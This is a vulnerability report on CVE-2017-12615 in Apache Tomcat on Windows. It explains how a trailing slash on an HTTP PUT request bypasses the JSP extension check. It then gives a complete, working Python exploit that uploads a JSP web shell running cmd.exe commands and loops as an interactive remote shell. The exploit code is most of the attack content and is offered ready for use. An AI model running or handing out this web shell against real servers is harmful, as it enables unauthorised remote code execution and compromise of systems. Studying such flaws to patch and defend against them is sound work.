<div align="center"><h1>CVE-2017-12615 REPORT</h1></div>

## About the vulnerability

When running Apache Tomcat on Windows with HTTP PUTs enabled (e.g. via setting the readonly initialisation parameter of the Default to false) it was possible to upload a JSP file to the server via a specially crafted request. This JSP could then be requested and any code it contained would be executed by the server.

**On versions:** Apache Tomcat 7.0.0 to 7.0.69

**Pre-requisites:** set readonly init parameter of Default to false i.e enable HTTP PUTs.

## Explanation

Apache Tomcat should not allow upload of file files .jsp extension variants.

`PUT /evil.jsp` should give an error.

But the extension check is bypassed when a '/' is added to the end of the url.

`PUT /evil.jsp/` triggers the vulnerability.

This happens because `file()` method in `VirtualDirContext.java` does not validate the extension correctly on appending '/' to the url.

Passing any jsp code by HTTP PUTs request to the Tomcat Server, on triggering the vulnerability, would lead to RCE on the server.

## Exploit

```
#!/usr/bin/python
import requests

targetURL = input('target url\n') #Url of the the Apache Tomcat Server

def cmdshell():
    command = input('$> ') #command to run at the target
    endpoint = 'http://' + targetURL + '/payload.jsp' #Url of the the Apache Tomcat Server along with the name of the jsp filed as it should appear in servers dir
    payload = '''
    <%@ page import="java.util.*,java.io.*"%>
    <%
    String cmd = "''' + command + '''";
    Process p;
    p = Runtime.getRuntime().exec("cmd.exe /C " + cmd);
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
    }
    %>
    ''' #Payload for RCE in .JSP format
    r = requests.put(endpoint+'/', data=payload) #Sending PUTs request with payload
    r = requests.get(endpoint) #For seeing the output of RCE
    print(r.content.decode("utf-8")) #decode response with UTF-8

while True:
    cmdshell()

```

This exploit was tested on Apache Tomcat 7.0.69 and allows RCE on the Apache Tomcat Server.

## Proof of Concept

[![Everything Is AWESOME](http://i.imgur.com/Ot5DWAW.png)](https://youtu.be/StTqXEQ2l-Y?t=35s "Everything Is AWESOME")
